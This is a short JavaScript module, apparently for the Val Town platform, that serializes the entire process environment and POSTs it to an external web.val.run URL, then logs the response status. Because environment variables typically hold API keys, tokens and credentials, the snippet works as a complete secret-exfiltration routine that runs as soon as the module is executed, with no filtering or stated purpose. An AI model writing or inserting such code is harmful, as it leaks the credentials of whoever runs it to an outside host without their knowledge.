const processEnv = process.env;

const result = await fetch(
  "https://nbbaier--8264a40c432d11f1b07842b51c65c3df.web.val.run",
  {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(processEnv),
  }
);

console.log(result.status);

export { result };
